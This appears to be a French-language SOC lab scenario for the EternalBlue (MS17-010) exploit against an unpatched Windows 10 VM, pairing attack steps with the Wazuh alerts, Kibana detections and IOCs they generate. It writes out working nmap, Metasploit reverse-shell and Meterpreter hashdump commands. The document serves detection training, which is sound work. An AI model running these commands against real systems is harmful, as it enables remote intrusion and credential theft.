# Scénario dattaque — EternalBlue (MS17-010)

## Contexte
Simulation dexploitation de la vulnérabilité MS17-010 (EternalBlue) sur Windows 10 non patché, dans lenvironnement SOC Lab.

## MITRE ATT&CK
- **Tactic** : Initial Access, Execution
- **Technique** : T1210 — Exploitation of Remote Services

## Étapes

### 1. Reconnaissance
```bash
nmap -sV -p 445 192.168.56.101
# Résultat attendu : port 445/tcp open microsoft-ds
nmap --script smb-vuln-ms17-010 192.168.56.101
# Résultat : VULNERABLE
```

### 2. Exploitation Metasploit
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.101
set LHOST 192.168.56.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

### 3. Post-exploitation
```bash
# Dans Meterpreter
getuid          # Vérifier privilèges (SYSTEM)
hashdump        # Extraire hashes NTLM
run post/multi/recon/local_exploit_suggester
```

## Alertes générées (Wazuh)
| Règle | Niveau | Description |
|-------|--------|-------------|
| 100003 | 14 | Malicious tool execution detected |
| 5712 | 10 | SMB exploit attempt |
| 61612 | 11 | Registry modification |

## Détection Kibana SIEM
- Spike de trafic SMB sur port 445
- Processus `lsass.exe` accédé par processus non autorisé
- Connexion Meterpreter vers IP externe

## IOCs
- IP attaquant : 192.168.56.100
- Port source : 4444 (Meterpreter default)
- Hash SHA256 payload : `[redacted pour lab]`
